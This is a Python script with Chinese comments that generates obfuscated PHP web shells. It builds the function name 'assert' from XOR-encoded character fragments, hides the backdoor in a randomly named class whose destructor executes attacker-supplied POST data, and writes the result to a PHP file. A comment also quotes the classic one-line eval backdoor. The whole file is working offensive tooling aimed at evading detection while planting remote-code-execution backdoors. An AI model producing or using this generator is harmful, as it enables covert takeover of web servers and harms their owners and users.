import  random
import  string
import  re
import  os
import  sys
import  getopt

'''
<?php @eval($_POST['123']); ?>  一句话木马

'''
class Avoid_Shell:
    #全局变量
    global rand_list
    rand_list = []
    #生成随机命名
    def randomName(self,length):
        #生成指定数量的随机字符
        #string.ascii_letters 是大小写字母组合
        # random.sample方法 生成指定数量的随机字符
        rand_str = ''.join(random.sample(string.ascii_letters,length))
        if rand_str not in rand_list:
            rand_list.append(rand_str)
            #print(rand_str)
            return rand_str
        else:
            return ''
    #取出名字
    def getName(self,length=4):

        while 1:
            name = Avoid_Shell.randomName(self,length)
            if name != '':
                break
        return  name
    #返回响应的异或运算表达式
    '''
    :param
    char_i 需要异或生成的char 字符
    '''
    def get_Xor(self,char_i):
        file_txt = ''
        txt_name = "char_"+char_i+".txt"
        try:
            if os.path.exists(txt_name):
                read_file = open(txt_name, 'r')
                file_txt = read_file.read()
                read_file.close()
                content_list = file_txt.split("\n")
                # random 进行随机选择
                rand_str = random.choice(content_list)
                # 取出来数值进行十六进制转换
                rand_int1 = int(re.match(r'\d{1,3}', rand_str).group())
                rand_int02 = re.search(r'-\d{1,3}', rand_str).group()
                rand_int2 = rand_int02.replace('-', '')
                rand_int2 = int(rand_int2)
                rand_str1 = str(hex(rand_int1))
                rand_str2 = str(hex(rand_int2))
                rand_str1 = rand_str1.replace("0", "\\", 1)
                rand_str2 = rand_str2.replace("0", "\\", 1)
                end_str = "\"" + rand_str1 + "\" ^ \"" + rand_str2 + "\";"
                #print(end_str)

                # return "\xc" ^ "\x6d";
                return end_str
            else:
                print("不存在该文件:"+txt_name)
        except:
            print("读取错误")




    '''
    password 密码
    command 命令  eval 和 assert
    '''
    def get_Content(self,password,command):
        #生成classname 变大写
        str_class_name = Avoid_Shell.getName(self)
        str_class_name = str_class_name.upper()
        #生成class 内方法的名字
        str_func_name = Avoid_Shell.getName(self)
        #列表存储随机生成的变量名,依次遍历
        command_xor_list = []
        for str_item in command:
            xor_name_item = Avoid_Shell.getName(self)
            command_xor_list.append(xor_name_item)
        #该方法返回的变量
        str_end_xor = Avoid_Shell.getName(self)
        #接收方法放回的值
        str_func_value = Avoid_Shell.getName(self)
        #参数传递 算是属性吧 $this ->
        str_value_name = Avoid_Shell.getName(self)
        #创建对象的命名,就把clss类的名字变成小写,可能是后面的一些命名重名,那么就是这的问题
        #几率很小只能说,算了名字后加上zjl 就行了
        str_object_name = str_class_name.lower() + "zjl"

        #拼接生成的字符串
        str_shell_php = "<?php\n"
        str_shell_php = str_shell_php + "class " + str_class_name +"{\n"
        str_shell_php = str_shell_php + "\tfunction " + str_func_name + "(){\n"
        str_xor_php = ""
        return_xor_php = "\t" * 2 + "$" + str_end_xor + " = "
        for str_i in range(len(command_xor_list)):
            xor_content_php = Avoid_Shell.get_Xor(self,command[str_i])
            str_xor_php = str_xor_php+"\t"*2 + "$" \
                            +command_xor_list[str_i] + " = " + xor_content_php + "\n"

        return_xor_php = return_xor_php+" $" + ".$".join(command_xor_list) + ";\n"
        str_shell_php = str_shell_php + str_xor_php + return_xor_php
        str_shell_php = str_shell_php+"\t"*2 + "return $" + str_end_xor + ";\n"
        str_shell_php = str_shell_php +"\t" + "}" + "\n"
        str_shell_php = str_shell_php + "\t" + "function __destruct(){\n"
        str_shell_php = str_shell_php +"\t"*2 + "$" + str_func_value + "= $this->" \
                                        +str_func_name + "();\n"
        str_shell_php = str_shell_php +"\t"*2 + "@$" + str_func_value + "($this->" \
                                        +str_value_name + ");\n"
        str_shell_php = str_shell_php + "\t}\n}\n"
        str_shell_php += "$" + str_object_name + " = new " \
                                +str_class_name +"();\n"
        str_shell_php += "@$" + str_object_name + "->" \
                        + str_value_name + " = isset($_GET['id'])?base64_decode($_POST['" \
                        + password +"']):$_POST['" + password + "'];\n"
        str_shell_php += "?>"

        #print(str_shell_php)
        return  str_shell_php















        pass


    def save_Shell_Php(self,str_save,name="avoid_shell.php"):
        #存放于save文件夹下
        file_name = "save/" + name
        try:
            write_file = open(file_name,"w")
            write_file.write(str_save)
            write_file.close()
        except:
            print("写入文件出错")
        print("生成成功,位置在: ",file_name)


    #只要创建对象,这个就会执行
    def __init__(self,password,file_name):
        #密码
        password_str = "123" if password =="" else password
        #选择使用的函数 eval 或 assert
        command_str ="assert"
        #生成的文件名(需要有后缀)
        file_name_str = "avoid_shell.php" if file_name =="" else file_name

        str_php=Avoid_Shell.get_Content(self,password_str,command_str)
        Avoid_Shell.save_Shell_Php(self,str_php,name=file_name_str)

if __name__ == '__main__':

    password = ""
    #eval 似乎不能这样子用
    command = ""
    file_name = ""
    #获取接收的内容
    get_argv = sys.argv[1:]
    try:
        #这些参数都是可以不带的,必须要带的参数后面要加:
        #h help p password c 命令 f 生成的文件
        #第三个参数[],以列表的格式定义 后面跟=是必须要的参数
        #该方法返回值由两个元素组成:
        # 第一个是 (option, value) 元组的列表。
        # 第二个是参数列表，包含那些没有 - 或 -- 的参数。
        opts , args = getopt.getopt(get_argv,"hp:c:f:",["help","password","command","file_name"])
    except getopt.GetoptError:
        print("-h or --help 进行帮助")
        sys.exit()
    for opt , arg in opts:
        if opt in ("-h","--help"):
            print("avoid_shell_php.py -p <password> -f <file_name 生成文件>")
            sys.exit()
        elif opt in ("-p","--password"):
            password = arg
        # elif opt in ("-c","--command"):
        #     command = "assert" if arg =='1' else "eval"
        elif opt in ("-f","--file_name"):
            file_name = arg

    #创建对象 生成文件
    shell = Avoid_Shell(password,file_name)